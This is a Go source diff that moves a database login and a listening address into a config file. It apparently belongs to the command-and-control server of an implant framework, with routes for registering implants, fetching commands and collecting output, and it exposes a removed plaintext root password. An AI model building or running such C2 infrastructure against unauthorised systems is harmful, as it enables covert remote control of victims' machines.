@@ -9,16 +9,31 @@ import (
 	_ "github.com/go-sql-driver/mysql"
 )
 
-var db *sql.DB
+var (
+	db     *sql.DB
+	config []Configuration
+)
 
 func main() {
+	config, err1 := LoadConfiguration("aef-profile.json")
+	if err1 != nil {
+		fmt.Println(err1)
+		return
+	}
+
+	user := config[0].Server[0].SQLUser
+	pass := config[0].Server[0].SQLPass
+
 	var err error
-	db, err = sql.Open("mysql", "root:lol.exe1@tcp(127.0.0.1:3306)/aef")
+	db, err = sql.Open("mysql", user+":"+pass+"@tcp(127.0.0.1:3306)/aef")
 	if err != nil {
 		panic(err)
 	}
 
-	var socket = ":8081"
+	serverip := config[0].Server[0].IP
+	serverport := config[0].Server[0].Port
+	var socket = serverip + ":" + serverport
+
 	http.HandleFunc("/registerNewImplant", registerNewImplant)
 	http.HandleFunc("/fetchCommand", fetchCommand)
 	http.HandleFunc("/fetchOutput", fetchOutput)
